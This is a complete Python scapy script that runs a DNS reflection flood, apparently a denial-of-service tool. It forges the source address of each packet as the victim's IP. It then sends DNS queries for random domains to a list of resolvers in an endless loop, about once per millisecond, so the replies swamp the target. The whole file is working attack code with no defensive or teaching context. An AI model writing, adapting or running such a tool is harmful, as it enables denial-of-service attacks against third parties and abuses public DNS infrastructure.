from scapy.all import *
import socket
import random
import time
import sys

def print_usage():
    usage = f"usage: {sys.argv[0]} [TARGET IP]"
    print(usage)
    sys.exit()

def main():
    try:
        args = sys.argv
        if len(args) < 2:
            print_usage()
        target = args[1]
        target_ip = socket.gethostbyname(target)

        with open("dnsservers.txt") as file:
            dnsservers = file.read().splitlines()
            file.close()

        with open("domains.txt") as file:
            domains = file.read().splitlines()
            file.close()

        packet = IP(src=target_ip) / UDP() / DNS(qd=DNSQR())
        sent = 0
        while True:
            for dnsserver in dnsservers:
                dnsserver = dnsserver.strip()
                domain = random.choice(domains).strip()
                packet[IP].dst = dnsserver
                packet[DNS].id = random.randrange(1000)
                packet[DNS][DNSQR].qname = domain
                sr1(packet, verbose=0, timeout=0)
                sent += 1
                print(f"SENT -> {sent}")
                time.sleep(1 / 1000)
    except Exception as e:
        print(f"main error: {e}")
        pass


if __name__ == "__main__":
    main()
